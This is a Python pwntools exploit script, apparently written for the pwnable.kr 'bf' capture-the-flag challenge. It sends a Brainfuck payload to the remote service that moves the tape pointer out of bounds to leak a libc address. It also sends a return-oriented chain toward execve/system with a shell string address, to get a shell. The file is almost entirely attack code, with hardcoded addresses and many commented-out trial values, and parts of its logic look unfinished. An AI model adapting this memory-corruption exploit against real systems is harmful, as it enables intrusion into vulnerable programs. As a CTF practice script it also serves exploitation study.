from pwn import *

context.update(arch="i386", os="linux")

# Logging
log.info("Start pwning...")

#ELF_NAME = "./ctf-bf"
ELF_NAME = "./bf"
# Load executable
#exe = ELF("./bf")
exe = ELF(ELF_NAME)

# Libc
libc = ELF("./libc.so.6")
#libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
libc_base = 0xf7e1b000 # Bf local one
#libc_base = 0xf7d73000 # TODO - re-adjust base - I changed it cuz of gdb 
#libc_base = 0xf7d73000 # The original base
#libc_base = 0xf7df8000 # The original base
#libc_base = 0xf7e0a000 # TODO - re-adjust base - I changed it cuz of gdb 
libc.address = libc_base
puts_addr = p32(next(libc.search(b"puts")))
#execve_addr = p32(next(libc.search(b"libc_system")))

#print(f"DUMP: {my_rop.dump()}")
# Start process
#conn = process("./ctf-bf")
conn = remote("pwnable.kr",9001)
#conn = process(ELF_NAME)
#conn = gdb.debug("./bf",
#env={"LD_PRELOAD":"./libc.so.6"}, gdbscript='''
#br *0x8048717
#'''
#)

with open("payload", "w") as f:
    f.write("")
#payload = ",.,.<\nAB\n".encode() # --> should work
# 1st part - before the input - just the commands
system_addr = libc.symbols["system"]
execve_addr = libc.symbols["execve"]
print(f"system_addr: {str(system_addr)}")
print(f"execve: {p32(execve_addr)}")
padding = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa"  
# fill stack with arbitrary values so I can increase esp and prepare stack for
#payload = padding +sh_addr + system_addr
sh_addr = system_addr + 0x120d7b

exit_addr = libc.symbols["exit"]
return_addr = 0x08048830 # return from program - we call it since if we call
return_addr = libc_base + 0x00003980 # return from program - we call it since if we call
#exit() then our execve() fork process will die
arbitrary_bash_addr = 0xffffcc0c
new_esp_val = 0x12345678
payload=padding+p32(0xdeadbeef)+p32(execve_addr)+p32(return_addr)+p32(sh_addr)+p32(0xffff2222)+p32(0xffff1234)+p32(sh_addr)+ p32(new_esp_val)
print(f"sh_addr: {str(sh_addr)}")
payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
payload += b".>.>.>." # leak the address of libc
payload += b"<<<" # leak the address of libc
#payload += "<" * 128 #move back 136 bytes -,.\nAB\n".encode() # --> should work
payload += b",>,>,>," # putchar - for sending the last char
payload += b"[" # call to puts()
payload +=b"\n"
conn.send(payload)
#payload += "." # call to putchar()
# 2nd part - the input to write ( the function to jump to ) 
with open("payload", "wb+") as f:
    f.write(payload)
# separate sends cuz of annoying encoding / decoding issue with p32() and
# strings
target = libc_base + 0x001134d9 # add to esp
my_rop = p32(target)
print(f"ROP: {my_rop}")
payload = my_rop
payload +=b"BBBB"
payload +=b"\n"
conn.send(payload)
with open("payload", "ab+") as f:
    f.write(payload)

print(payload)

print(conn.recvline()) # main massage
print(conn.recvline()) # main massage 2
output = conn.recv()
with open("output", "wb") as a:
    a.write(output)

print(f"OUTPUT: {output}")
puts_addr = unpack(output, endian='little')
print(f"puts addr: {puts_addr}") # receive until newline
print(f"puts addr: {hex(puts_addr)}") # receive until newline
puts_distance_from_libc = 392368
print(f"distance: {puts_distance_from_libc}")
libc_addr = puts_addr - puts_distance_from_libc
print(f"libc addr: {libc_addr}") # receive until newline
print(f"libc addr: {hex(libc_addr)}") # receive until newline
libc.address = libc_addr
system_addr = libc.symbols["system"]
execve_addr = libc.symbols["execve"]
print(f"system_addr: {str(system_addr)}")
print(f"execve: {str(execve_addr)}")




